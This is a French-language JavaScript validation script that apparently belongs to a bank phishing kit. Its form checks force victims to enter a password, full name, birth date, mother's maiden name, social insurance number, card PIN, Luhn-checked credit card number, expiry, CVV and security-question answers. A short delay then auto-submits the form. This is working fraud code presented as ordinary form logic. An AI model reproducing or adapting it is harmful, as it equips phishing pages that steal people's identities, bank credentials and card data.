
function hasNumber(t){return /\d/.test(t);}

function checkform ( form )
{
     if (form.pass.value.length < 5) {
    alert( "Erreur: Mot de Passe" );
    form.pass.focus();
	  document.getElementById('pass').style.backgroundColor="#FF6A6A";
    return false ;
  } 
     if (form.fname.value.length < 6) {
    alert( "Erreur: Nom Complet" );
    form.fname.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="#FF6A6A";
    return false ;
  }  

     if (form.jj.value.length < 1) {
    alert( "Erreur: Date De Naissance (JJ)" );
    form.jj.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor=""
	  document.getElementById('jj').style.backgroundColor="#FF6A6A";
    return false ;
  } 
     if (form.mm.value.length < 1) {
    alert( "Erreur: Date De Naissance (MM)" );
    form.mm.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="#FF6A6A";
    return false ;
  }  
     if (form.aaaa.value.length < 4) {
    alert( "Erreur: Date De Naissance (AAAA)" );
    form.aaaa.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="#FF6A6A";
    return false ;
  } 
  if (form.mmn.value.length < 3) {
    alert( "Erreur: Nom de jeune fille de votre mere:" );
    form.mmn.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="#FF6A6A";
	  
    return false ;
  }  
     if (form.sin1.value.length < 3) {
    alert( "Erreur: Numero d'assurance social (NAS)" );
    form.sin1.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="#FF6A6A";
    return false ;
  }   
  
     if (form.sin2.value.length < 3) {
    alert( "Erreur: Numero d'assurance social (NAS)" );
    form.sin2.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="#FF6A6A";
    return false ;
  } 
     if (form.sin3.value.length < 3) {
    alert( "Erreur: Numero d'assurance social (NAS)" );
    form.sin3.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="#FF6A6A";
    return false ;
  } 
     if (form.telf.value.length < 5) {
    alert( "Erreur: Numero de telephone Residentiel" );
    form.telf.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="#FF6A6A";
    return false ;
  } 
  
       if (form.work.value.length < 1) {
    alert( "Erreur: Lieu de travail" );
    form.work.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="#FF6A6A";
    return false ;
  } 
  
         if (form.pin.value.length < 5) {
    alert( "Erreur: NIP (Numero d'identification personnel)" );
    form.pin.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="#FF6A6A";
    return false ;
  } 
 
      if (isNaN(form.pin.value)) {
    alert( "Erreur: NIP (Numero d'identification personnel)" );
    form.pin.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="#FF6A6A";
    return false ;
  }  
   if (form.ccnr.value.length < 16) {
    alert( "Erreur: Numero de carte de credit" );
    form.ccnr.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  } 
      if (!	verifyMod10(form.ccnr.value)) {
    alert( "Erreur: Numero de carte de credit incorrecte" );
    form.ccnr.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  } 
  if (form.expm.value.length < 1) {
    alert( "Erreur: Expiration (MOIS)" );
    form.expm.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="#FF6A6A";
    return false ;
  } 
 if (form.expy.value.length < 1) {
    alert( "Erreur: Expiration (An)" );
    form.expy.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="#FF6A6A";
    return false ;
  } 
   if (form.cvv.value.length < 3) {
    alert( "Erreur: Code de sécurité" );
    form.cvv.focus();
	  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="#FF6A6A";
    return false ;
  } 
        if (form.q1.value.length < 1) {
		alert( "Erreur: Question 1 incorrecte." );
		form.q1.focus();
			  document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="#FF6A6A";
		return false ;
	  }
	          if (form.a1.value.length < 1) {
		alert( "Erreur: Reponse 1 incorrecte." );
		form.a1.focus();
		document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="";
		  document.getElementById('a1').style.backgroundColor="#FF6A6A";
		return false ;
	  }
	  	          if (form.q2.value.length < 1) {
		alert( "Erreur: Question 2 incorrecte." );
		form.q2.focus();
		document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="";
		  document.getElementById('a1').style.backgroundColor="";
		  document.getElementById('q2').style.backgroundColor="#FF6A6A";
		return false ;
	  }
	  
	  	          if (form.a2.value.length < 1) {
		alert( "Erreur: Reponse 2 incorrecte." );
		form.a2.focus();
		document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="";
		  document.getElementById('a1').style.backgroundColor="";
		  document.getElementById('q2').style.backgroundColor="";
		  document.getElementById('a2').style.backgroundColor="#FF6A6A";
		return false ;
	  }
	  	  	          if (form.q3.value.length < 1) {
		alert( "Erreur: Question 3 incorrecte." );
		form.q3.focus();
		document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="";
		  document.getElementById('a1').style.backgroundColor="";
		  document.getElementById('q2').style.backgroundColor="";
		  document.getElementById('a2').style.backgroundColor="";
		  document.getElementById('q3').style.backgroundColor="#FF6A6A";
		return false ;
	  }
	  	  	  	          if (form.a3.value.length < 1) {
		alert( "Erreur: Reponse 3 incorrecte." );
		form.a3.focus();
		document.getElementById('pass').style.backgroundColor="";
	  document.getElementById('fname').style.backgroundColor="";
	  document.getElementById('mmn').style.backgroundColor="";
	  document.getElementById('jj').style.backgroundColor="";
	  document.getElementById('mm').style.backgroundColor="";
	  document.getElementById('aaaa').style.backgroundColor="";
	  document.getElementById('sin1').style.backgroundColor="";
	  document.getElementById('sin2').style.backgroundColor="";
	  document.getElementById('sin3').style.backgroundColor="";
	  document.getElementById('telf').style.backgroundColor="";
	  document.getElementById('work').style.backgroundColor="";
	  document.getElementById('pin').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
		  document.getElementById('q1').style.backgroundColor="";
		  document.getElementById('a1').style.backgroundColor="";
		  document.getElementById('q2').style.backgroundColor="";
		  document.getElementById('a2').style.backgroundColor="";
		  document.getElementById('q3').style.backgroundColor="";
		  document.getElementById('a3').style.backgroundColor="#FF6A6A";
		return false ;
	  }
  
  
  
  
  
  
  
  
	  return true ;
	  }

	  
	  
	  
  function removeSpacesFromPAN(fieldName) // strips off spaces before and after field name
{

	var startIndex, lastIndex;
	var newFieldName, newC;

	lastIndex = fieldName.length-1;
	startIndex = 0;

	newC = fieldName.charAt(startIndex);
	while ((startIndex<lastIndex) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		startIndex++;
		newC = fieldName.charAt(startIndex);
	}

	newC = fieldName.charAt(lastIndex);
	while ((lastIndex>=0) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		lastIndex--;
		newC = fieldName.charAt(lastIndex);
	}
	if (startIndex<=lastIndex) {
		newFieldName = fieldName.substring(startIndex, lastIndex+1);
		return newFieldName;
	} else {
		return fieldName;
	}
}


function verifyMod10(field)
{
	var PAN = field;

	PAN = removeSpacesFromPAN(PAN);
	var st = PAN;

	if (st.length > 19)
		return false;

	var sum = 0;
	var mul = 1;
	var st_len = st.length;
	var tproduct;

	for (i = 0; i < st_len; i++)
	{
		digit = st.substring(st_len-i-1, st_len-i);

		if (digit == " " || digit == "-")
			continue;

		tproduct = parseInt(digit ,10) * mul;

	    if (tproduct >= 10)
	      sum += (tproduct % 10) + 1;
	    else
	      sum += tproduct;

	    if (mul == 1)
	      mul++;
	    else
	      mul--;
	}

	if ((sum % 10) != 0)
		return false;
 
	return true;
}

function formSub(){
 setTimeout("document.CommonData.submit()",1000);
}

function logPANentry(action) {

                var loc = document.location.pathname.substr(document.location.pathname.lastIndexOf("/")+1)
       
                var rn = Math.random()+"";
                var a = rn * 10000000000000;
                
                
}